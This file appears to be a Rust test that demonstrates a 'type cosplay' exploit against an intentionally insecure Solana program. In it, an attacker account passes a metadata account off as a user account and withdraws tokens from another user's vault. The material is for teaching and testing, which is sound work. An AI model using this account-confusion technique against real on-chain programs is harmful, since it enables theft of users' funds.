use trdelnik::*;
use fehler::throws;
use program_client::type_cosplay_insecure_instruction;
use std::mem;
use solana_sdk::system_program;
use type_cosplay_insecure::{Vault, User, TransferMetadata};
use anchor_lang::prelude::*;
use borsh::BorshDeserialize;

#[trdelnik_test]
async fn test_insecure() {
    // initialize test fixture
    let reader = Reader::with_root("../../../");
    let mut fixture = Fixture {
        client: Client::new(system_keypair(0)),
        program: program_keypair(3),
        program_data: reader.program_data("type_cosplay_insecure").await?,
        valid_user: system_keypair(3),
        valid_user_vault_account: keypair(30),
        valid_user_user_account: keypair(31),
        attacker: system_keypair(5),
        attacker_vault_account: keypair(51),
        attacker_user_account: keypair(50),
        hack_meta_account: keypair(98),
        valid_meta_account: keypair(99),
    };
    // deploy a tested program
    fixture.deploy().await?;
    fixture.register_valid_user().await?;
    // attacker register himself which creates a new user account
    fixture.client.airdrop(fixture.attacker.pubkey(), 10_000_000_000).await?;
    type_cosplay_insecure_instruction::add_user(
        &fixture.client, 
        fixture.attacker_user_account.pubkey(),
        fixture.attacker_vault_account.pubkey(),
        fixture.attacker.pubkey(),
        system_program::ID,
        [
            fixture.attacker_vault_account.clone(), 
            fixture.attacker_user_account.clone(), 
            fixture.attacker.clone(),
        ]
    ).await?;
    
    // by calling withdraw an attacker ensures the creation of a meta account
    type_cosplay_insecure_instruction::withdraw(
        &fixture.client,
        1,
        fixture.hack_meta_account.pubkey(),
        fixture.attacker_user_account.pubkey(),
        fixture.attacker.pubkey(),
        fixture.attacker_vault_account.pubkey(),
        fixture.valid_user_vault_account.pubkey(),
        system_program::ID,
        [
            fixture.hack_meta_account.clone(), 
            fixture.attacker.clone(),
        ]
    ).await?.print();
    
    let attacker_vault_account = fixture.client.get_account(fixture.attacker_vault_account.pubkey()).await?.unwrap();
    let attacker_vault = Vault::try_from_slice(&attacker_vault_account.data[..]).unwrap();
    println!("Attacker's balance after withdraw is {} tokens", attacker_vault.balance);

    let user_vault_account = fixture.client.get_account(fixture.valid_user_vault_account.pubkey()).await?.unwrap();
    let user_vault = Vault::try_from_slice(&user_vault_account.data[..]).unwrap();
    println!("User's balance after withdraw is {} tokens", user_vault.balance);
    
    // type cosplay ATTACK
    type_cosplay_insecure_instruction::withdraw(
        &fixture.client,
        11,
        fixture.valid_meta_account.pubkey(),
        fixture.hack_meta_account.pubkey(),
        fixture.attacker.pubkey(),
        fixture.valid_user_vault_account.pubkey(),
        fixture.attacker_vault_account.pubkey(),
        system_program::ID,
        [
            fixture.valid_meta_account.clone(), 
            fixture.attacker.clone(),
        ]
    ).await?.print();

    let attacker_vault_account = fixture.client.get_account(fixture.attacker_vault_account.pubkey()).await?.unwrap();
    let attacker_vault = Vault::try_from_slice(&attacker_vault_account.data[..]).unwrap();
    println!("Attacker's balance after withdraw is {} tokens", attacker_vault.balance);

    let user_vault_account = fixture.client.get_account(fixture.valid_user_vault_account.pubkey()).await?.unwrap();
    let user_vault = Vault::try_from_slice(&user_vault_account.data[..]).unwrap();
    println!("User's balance after withdraw is {} tokens", user_vault.balance);
}

struct Fixture {
    client: Client,
    program: Keypair,
    program_data: Vec<u8>,
    valid_user: Keypair,
    valid_user_vault_account: Keypair,
    valid_user_user_account: Keypair,
    attacker: Keypair,
    attacker_vault_account: Keypair,
    attacker_user_account: Keypair,
    hack_meta_account: Keypair,
    valid_meta_account: Keypair,
}

impl Fixture {
    #[throws]
    async fn deploy(&mut self) {
        self.client.airdrop(self.client.payer().pubkey(), 10_000_000_000).await?;
        self.client.deploy(
            self.program.clone(),
            mem::take(&mut self.program_data)
        ).await?;
    }
    #[throws]
    async fn register_valid_user(&self) {
        self.client.airdrop(self.valid_user.pubkey(), 10_000_000_000).await?;
        type_cosplay_insecure_instruction::add_user(
            &self.client, 
            self.valid_user_user_account.pubkey(),
            self.valid_user_vault_account.pubkey(),
            self.valid_user.pubkey(),
            system_program::ID,
            [
                self.valid_user_vault_account.clone(), 
                self.valid_user_user_account.clone(), 
                self.valid_user.clone()
            ]
        ).await?;
    }
}